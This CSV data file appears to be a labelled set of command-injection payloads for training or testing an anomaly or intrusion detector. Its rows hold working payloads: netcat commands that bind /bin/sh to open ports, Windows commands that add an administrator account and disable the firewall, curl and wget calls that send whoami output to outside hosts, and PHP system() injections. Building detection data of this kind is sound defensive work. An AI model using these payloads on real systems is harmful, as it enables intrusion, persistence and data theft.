payload,length,attack_type,label
exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),1513,cmdi,anom
exec('ls'),10,cmdi,anom
exec('pwd'),11,cmdi,anom
exec('pwd');,12,cmdi,anom
exec('sleep 5'),15,cmdi,anom
exec('sleep 5');,16,cmdi,anom
exec('whoami'),14,cmdi,anom
exec('whoami');,15,cmdi,anom
";{$_GET[""cmd""]}",15,cmdi,anom
`id`,4,cmdi,anom
|id,3,cmdi,anom
| id,4,cmdi,anom
;id,3,cmdi,anom
;id|,4,cmdi,anom
;id;,4,cmdi,anom
& id,4,cmdi,anom
&&id,4,cmdi,anom
;id\n,5,cmdi,anom
ifconfig,8,cmdi,anom
| ifconfig,10,cmdi,anom
; ifconfig,10,cmdi,anom
& ifconfig,10,cmdi,anom
&& ifconfig,11,cmdi,anom
/index.html|id|,15,cmdi,anom
ipconfig,8,cmdi,anom
| ipconfig /all,15,cmdi,anom
; ipconfig /all,15,cmdi,anom
& ipconfig /all,15,cmdi,anom
&& ipconfig /all,16,cmdi,anom
ipconfig /all,13,cmdi,anom
ls,2,cmdi,anom
$(`ls`),7,cmdi,anom
| ls -l /,9,cmdi,anom
; ls -l /,9,cmdi,anom
& ls -l /,9,cmdi,anom
&& ls -l /,10,cmdi,anom
ls -l /,7,cmdi,anom
| ls -laR /etc,14,cmdi,anom
; ls -laR /etc,14,cmdi,anom
& ls -laR /etc,14,cmdi,anom
&& ls -laR /etc,15,cmdi,anom
| ls -laR /var/www,18,cmdi,anom
; ls -laR /var/www,18,cmdi,anom
& ls -laR /var/www,18,cmdi,anom
&& ls -laR /var/www,19,cmdi,anom
| ls -l /etc/,13,cmdi,anom
; ls -l /etc/,13,cmdi,anom
& ls -l /etc/,13,cmdi,anom
&& ls -l /etc/,14,cmdi,anom
ls -l /etc/,11,cmdi,anom
ls -lh /etc/,12,cmdi,anom
| ls -l /home/*,15,cmdi,anom
; ls -l /home/*,15,cmdi,anom
& ls -l /home/*,15,cmdi,anom
&& ls -l /home/*,16,cmdi,anom
ls -l /home/*,13,cmdi,anom
*; ls -lhtR /var/www/,21,cmdi,anom
| ls -l /tmp,12,cmdi,anom
; ls -l /tmp,12,cmdi,anom
& ls -l /tmp,12,cmdi,anom
&& ls -l /tmp,13,cmdi,anom
ls -l /tmp,10,cmdi,anom
| ls -l /var/www/*,18,cmdi,anom
; ls -l /var/www/*,18,cmdi,anom
& ls -l /var/www/*,18,cmdi,anom
&& ls -l /var/www/*,19,cmdi,anom
ls -l /var/www/*,16,cmdi,anom
\n,2,cmdi,anom
\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,82,cmdi,anom
\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,82,cmdi,anom
\n/bin/ls -al\n,15,cmdi,anom
| nc -lvvp 4444 -e /bin/sh|,27,cmdi,anom
; nc -lvvp 4444 -e /bin/sh;,27,cmdi,anom
& nc -lvvp 4444 -e /bin/sh&,27,cmdi,anom
&& nc -lvvp 4444 -e /bin/sh &,29,cmdi,anom
nc -lvvp 4444 -e /bin/sh,24,cmdi,anom
nc -lvvp 4445 -e /bin/sh &,26,cmdi,anom
nc -lvvp 4446 -e /bin/sh|,25,cmdi,anom
nc -lvvp 4447 -e /bin/sh;,25,cmdi,anom
nc -lvvp 4448 -e /bin/sh&,25,cmdi,anom
\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,81,cmdi,anom
\necho INJECTX\nexit\n\033[2Asleep 5\n,38,cmdi,anom
\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,81,cmdi,anom
| net localgroup Administrators hacker /ADD,43,cmdi,anom
; net localgroup Administrators hacker /ADD,43,cmdi,anom
& net localgroup Administrators hacker /ADD,43,cmdi,anom
&& net localgroup Administrators hacker /ADD,44,cmdi,anom
net localgroup Administrators hacker /ADD,41,cmdi,anom
| netsh firewall set opmode disable,35,cmdi,anom
; netsh firewall set opmode disable,35,cmdi,anom
& netsh firewall set opmode disable,35,cmdi,anom
&& netsh firewall set opmode disable,36,cmdi,anom
netsh firewall set opmode disable,33,cmdi,anom
netstat,7,cmdi,anom
;netstat -a;,12,cmdi,anom
| netstat -an,13,cmdi,anom
; netstat -an,13,cmdi,anom
& netstat -an,13,cmdi,anom
&& netstat -an,14,cmdi,anom
netstat -an,11,cmdi,anom
| net user hacker Password1 /ADD,32,cmdi,anom
; net user hacker Password1 /ADD,32,cmdi,anom
& net user hacker Password1 /ADD,32,cmdi,anom
&& net user hacker Password1 /ADD,33,cmdi,anom
net user hacker Password1 /ADD,30,cmdi,anom
| net view,10,cmdi,anom
; net view,10,cmdi,anom
& net view,10,cmdi,anom
&& net view,11,cmdi,anom
net view,8,cmdi,anom
\nid|,5,cmdi,anom
\nid;,5,cmdi,anom
\nid\n,6,cmdi,anom
\n/usr/bin/id\n,15,cmdi,anom
"perl -e 'print ""X""x1024'",24,cmdi,anom
"|| perl -e 'print ""X""x16096'",28,cmdi,anom
"| perl -e 'print ""X""x16096'",27,cmdi,anom
"; perl -e 'print ""X""x16096'",27,cmdi,anom
"& perl -e 'print ""X""x16096'",27,cmdi,anom
"&& perl -e 'print ""X""x16096'",28,cmdi,anom
"perl -e 'print ""X""x16384'",25,cmdi,anom
"; perl -e 'print ""X""x2048'",26,cmdi,anom
"& perl -e 'print ""X""x2048'",26,cmdi,anom
"&& perl -e 'print ""X""x2048'",27,cmdi,anom
"perl -e 'print ""X""x2048'",24,cmdi,anom
"|| perl -e 'print ""X""x4096'",27,cmdi,anom
"| perl -e 'print ""X""x4096'",26,cmdi,anom
"; perl -e 'print ""X""x4096'",26,cmdi,anom
"& perl -e 'print ""X""x4096'",26,cmdi,anom
"&& perl -e 'print ""X""x4096'",27,cmdi,anom
"perl -e 'print ""X""x4096'",24,cmdi,anom
"|| perl -e 'print ""X""x8096'",27,cmdi,anom
"| perl -e 'print ""X""x8096'",26,cmdi,anom
"; perl -e 'print ""X""x8096'",26,cmdi,anom
"&& perl -e 'print ""X""x8096'",27,cmdi,anom
"perl -e 'print ""X""x8192'",24,cmdi,anom
"perl -e 'print ""X""x81920'",25,cmdi,anom
|| phpinfo(),12,cmdi,anom
| phpinfo(),11,cmdi,anom
 {${phpinfo()}},15,cmdi,anom
;phpinfo(),10,cmdi,anom
;phpinfo();//,13,cmdi,anom
';phpinfo();//,14,cmdi,anom
{${phpinfo()}},14,cmdi,anom
& phpinfo(),11,cmdi,anom
&& phpinfo(),12,cmdi,anom
phpinfo(),9,cmdi,anom
phpinfo();,10,cmdi,anom
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get"");?>",90,cmdi,anom
"<?php system(""curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj"");?>",81,cmdi,anom
"<?php system(""echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"");?>",1524,cmdi,anom
"<?php system(""sleep 10"");?>",27,cmdi,anom
"<?php system(""sleep 5"");?>",26,cmdi,anom
